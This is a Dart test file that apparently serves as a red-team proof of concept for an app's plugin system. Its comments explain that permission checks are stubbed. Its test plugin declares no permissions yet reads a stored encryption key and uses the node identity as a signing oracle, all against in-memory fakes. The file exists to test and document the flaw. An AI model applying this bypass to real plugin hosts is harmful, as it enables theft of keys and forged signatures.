// RED TEAM PoC — the plugin "sandbox" has no walls.
//
// lib/services/plugin_service.dart:
//   * `_validatePermissions` (line 378) is `return true;` — declared
//     permissions are never checked at install OR at execution.
//   * `registerPlugin` hands every plugin a PluginContext carrying the
//     app's Riverpod `Ref` (line 233). PluginContext.read()
//     (plugin_interface.dart:54) resolves ANY provider in the graph —
//     there is no allowlist, no permission check, no scoping.
//
// So a plugin manifest declaring `permissions: []` can still, from
// inside executeAction:
//   * read secureStorageServiceProvider → every stored DEK
//     ('dek_<uuid>' — the keys round-2 moved OUT of the database are
//     back in reach for any plugin), the mnemonic-backup marker, the
//     audit HMAC key 'master_key_v1', etc.
//   * read identityServiceProvider → sign() oracle over arbitrary
//     bytes — forge ledger entries, votes, receipts, Beacon envelopes.
//   * read creditServiceProvider → inspect/spend the node's credits.
//
// Asserts the SECURE expectation: a plugin that declares no
// permissions must not be able to reach sensitive providers through
// its context. Failure marks the trust boundary decorative.
import 'dart:typed_data';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:alexandria/services/encryption_service.dart';
import 'package:alexandria/services/identity_service.dart';
import 'package:alexandria/services/plugin_service.dart';
import 'package:alexandria/services/secure_storage_service.dart';

/// In-memory secure store carrying a planted DEK.
class _FakeSecureStorage extends SecureStorageService {
  final Map<String, String> map = {'dek_victim-doc': 'U0VDUkVULURFSw=='};
  @override
  Future<String?> read(String key) async => map[key];
  @override
  Future<void> write(String key, String value) async => map[key] = value;
  @override
  Future<void> delete(String key) async => map.remove(key);
  @override
  Future<bool> containsKey(String key) async => map.containsKey(key);
}

class _FakeIdentityService extends IdentityService {
  _FakeIdentityService() : super(_FakeSecureStorage());
  @override
  Future<AlexandriaIdentity?> getIdentity() async => AlexandriaIdentity(
        publicKey: Uint8List.fromList(List.filled(32, 0x42)),
        privateKey: Uint8List.fromList(List.filled(32, 0x99)),
        createdAt: DateTime(2020),
      );
  @override
  Future<Uint8List> sign(Uint8List data) async =>
      Uint8List.fromList(List.filled(64, 0x77)); // forged "signature"
}

/// A plugin that declares ZERO permissions — yet reaches the crown
/// jewels through PluginContext.read.
class _ZeroPermPlugin implements AlexandriaPlugin {
  PluginContext? ctx;
  Map<String, Object?> loot = {};

  @override
  final PluginManifest manifest = const PluginManifest(
    id: 'com.evil.zero-perm',
    name: 'Innocent Plugin',
    version: '1.0.0',
    author: 'attacker',
    description: 'declares no permissions',
    entrypoint: 'innocent.wasm',
    permissions: [], // ← declares NOTHING
  );

  @override
  bool isEnabled = true;

  @override
  Future<void> initialize(PluginContext context) async => ctx = context;

  @override
  List<PluginActionDefinition> get actions => const [];

  @override
  Future<PluginActionResult> executeAction(
      String actionId, Map<String, dynamic> parameters) async {
    final c = ctx!;
    // Exfiltrate a content DEK straight out of the keychain-backed
    // store — the exact material round-2 removed from the db row.
    loot['dek'] =
        await c.read(secureStorageServiceProvider).read('dek_victim-doc');
    // Use the node identity as a signing oracle.
    final idsvc = c.read(identityServiceProvider);
    loot['pubkey'] = (await idsvc.getIdentity())?.publicKeyBase58;
    loot['sig'] = (await idsvc.sign(Uint8List.fromList([1, 2, 3]))).length;
    return PluginActionResult.ok('exfil complete');
  }

  @override
  Future<void> onHook(PluginHook hook, payload) async {}
}

void main() {
  test(
      'a zero-permission plugin must not read identity keys or secure '
      'storage via PluginContext', () async {
    // Capture a real Ref from a container wired like production.
    final refCapture = Provider<Ref>((ref) => ref);
    final container = ProviderContainer(overrides: [
      secureStorageServiceProvider.overrideWithValue(_FakeSecureStorage()),
      identityServiceProvider.overrideWithValue(_FakeIdentityService()),
      encryptionServiceProvider.overrideWithValue(EncryptionService()),
    ]);
    addTearDown(container.dispose);
    final ref = container.read(refCapture);

    final pluginService = PluginService(ref);
    final evil = _ZeroPermPlugin();
    pluginService.registerPlugin(evil);

    final result =
        await pluginService.executeAction('com.evil.zero-perm', 'any');

    expect(result.success, isTrue);
    expect(evil.loot['dek'], isNull,
        reason: 'a plugin with permissions:[] read a content DEK out of '
            'secure storage — PluginContext.read exposes the entire '
            'provider graph and _validatePermissions is a stub '
            '(return true). Declared permissions gate nothing.');
    expect(evil.loot['sig'], isNull,
        reason: 'a zero-permission plugin used the node identity as a '
            'signing oracle (got a ${evil.loot['sig']}-byte signature) — '
            'it can forge ledger entries, votes and receipts.');
  });
}
